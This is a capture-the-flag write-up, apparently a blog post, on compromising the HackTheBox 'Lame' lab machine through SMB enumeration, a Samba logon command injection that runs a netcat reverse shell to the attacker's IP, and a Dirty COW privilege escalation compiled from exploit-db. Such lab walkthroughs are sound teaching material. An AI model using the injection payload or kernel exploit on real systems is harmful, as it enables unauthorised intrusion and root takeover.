---
author:
  name: "papadope"
date: 2021-01-28
linktitle: Lame
type:
- post
title: Lame
weight: 10
series:
- HackTheBox
---

![Room Image](/lame/room.png)

## Enumeration

From a really quick nmap we can realize that there are 4 open ports on the machine.

```

- 21/tcp
- 22/tcp
- 139/tcp
- 445/tcp

```

---

## Smb

After enumerating the smb port I found that there are shares that I can connect to.

```

🚀 sudo nmap -sU -sS --script smb-enum-shares.nse -p T:139 10.10.10.3

```

![smb Image](/lame/smb.png)

*Did you notice the Comment on /tmp share?*

---

## Useful comment

I had a problem running smbclient for some reason on my kali box. I was getting an error about "timeout" or "connection error" with absolutely no reason. After one hour investigating I found out that with a small edit on **/etc/samba/smb.conf**, finally worked.

- I added **client min protocol = NT1** under *global section* and problem solved.

---

## Getting a shell through smb

I used this command to get a reverse shell through samba: 

```

logon "./=`nohup nc -e /bin/bash **your_ip** 1234`"

```

![smb1 Image](/lame/smb1.png)

And I got the RVShell

![rv Image](/lame/rv.png)

---

## Privesc

After running some basic scripts you can quickly realize that you can privesc really quick & simple.

I will just leave this here 😉

![uname Image](/lame/uname.png)

You should check [this](https://www.exploit-db.com/exploits/40839) also.

---

## Exploit

Get the code from exploitdb. You can find it almost everywhere.
Compile the code on the machine with : 

```

gcc -pthread dc.c -o dc -lcrypt

```

Then run the compiled code with **./dc** (you can use your own name ofc) and enter a new password. Type your password & ssh into the machine with the **firefart** username.

**ssh firefart@10.10.10.3**

![exploit Image](/lame/exploit.png)

Thank you very much for reading.